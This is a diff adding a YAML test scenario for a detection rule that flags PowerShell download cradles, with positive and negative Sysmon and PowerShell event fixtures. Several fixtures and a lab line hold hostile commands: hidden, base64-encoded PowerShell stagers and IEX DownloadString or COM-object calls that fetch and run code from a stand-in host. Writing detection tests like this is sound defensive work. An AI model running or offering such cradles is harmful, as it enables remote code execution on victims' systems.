@@ -1,0 +1,27 @@
+scenario: SCE_Exec_PowerShell_Download_Cradle
+cases:
+  - name: positive_encoded_stager_with_webclient
+    expect_incidents: [exec_powershell_download_cradle]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=', ParentImage: 'C:\Windows\System32\cmd.exe'}
+      - at: 2
+        event: {EventID: 4104, Channel: Microsoft-Windows-PowerShell/Operational, ScriptBlockText: "$c=New-Object System.Net.WebClient;IEX $c.DownloadString('http://203.0.113.9/s')", MessageNumber: 1, MessageTotal: 1}
+  - name: positive_com_cradle_before_process_event
+    # 4104 может прийти раньше Sysmon 1 (разные каналы) - temporal без порядка
+    expect_incidents: [exec_powershell_download_cradle]
+    events:
+      - event: {EventID: 4104, Channel: Microsoft-Windows-PowerShell/Operational, ScriptBlockText: "$o=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('F5078F35-C551-11D3-89B9-0000F81FE221'));$o.open('GET','http://203.0.113.9/s',$false)"}
+      - at: 1
+        event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA='}
+  - name: negative_encoded_without_download
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell -enc JABhAD0AMQA='}
+      - at: 2
+        event: {EventID: 4104, Channel: Microsoft-Windows-PowerShell/Operational, ScriptBlockText: '$a=1'}
+  - name: negative_download_without_encoded_launch
+    expect_incidents: []
+    events:
+      - event: {EventID: 4104, Channel: Microsoft-Windows-PowerShell/Operational, ScriptBlockText: "(New-Object System.Net.WebClient).DownloadFile('https://example.org/tool.zip','C:\\tools\\tool.zip')"}
+lab:
+  - '$s = "IEX (New-Object System.Net.WebClient).DownloadString(''http://127.0.0.1:9/x'')"; powershell -nop -enc ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s)))'
